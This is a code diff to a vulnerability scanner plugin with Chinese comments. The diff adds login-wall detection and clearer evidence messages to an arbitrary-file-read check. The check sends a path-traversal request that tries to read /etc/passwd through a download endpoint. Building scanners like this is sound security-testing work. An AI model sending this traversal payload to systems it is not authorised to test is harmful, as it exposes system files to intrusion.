@@ -3,6 +3,7 @@ from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanRes
 from core.http import join_url
 from lib.colors import no, ok
 from lib.matcher import match_file_read_leak
+from lib.reachability import login_wall_reason
 from lib.reporter import emit
 from plugins.base import PluginBase
 
@@ -52,10 +53,22 @@ class FileReadPlugin(PluginBase):
         # 原 URL 拼接：self.url + '/common/...'（self.url 以 / 结尾，保留双斜杠特性）
         url = join_url(target, "/common/download/resource?resource=/profile/../../../../../../../etc/passwd")
         try:
-            file_read_use = session.get(url).text or ""
+            resp = session.get(url)
+            file_read_use = resp.text or ""
         except Exception as e:
             emit(no("任意文件读取（网络异常）"))
             return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
+        # 登录墙（302 -> /login / 200 登录页）：没读到文件内容 ≠ 不存在
+        _wall = login_wall_reason(resp)
+        if _wall:
+            emit(no("任意文件读取（登录墙拦截）"))
+            return ScanResult(
+                kind="vuln",
+                name=self.name,
+                status=STATUS_UNKNOWN,
+                url=url,
+                evidence=f"请求被登录墙拦截（{_wall}），无法判定文件读取是否存在",
+            )
         # 强特征判定：使用 lib.matcher.match_file_read_leak（校验 root:x:0:0:、daemon:x:1:1: 等真实 passwd 行特征）。
         # 加固说明：原判据 match_all(text, ["root", ":/"]) 过弱——":/" 在任意含 URL 的页面都出现，
         # "root" 更是 HTML/JS/报错页的常客，普通页面即可满足，造成确定性误报。
@@ -78,4 +91,10 @@ class FileReadPlugin(PluginBase):
             )
         else:
             emit(no("不存在任意文件读取漏洞"))
-            return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url)
+            return ScanResult(
+                kind="vuln",
+                name=self.name,
+                status=STATUS_SAFE,
+                url=url,
+                evidence="HTTP 200 但响应未含 /etc/passwd 真实行特征（root:x:0:0: 等）",
+            )
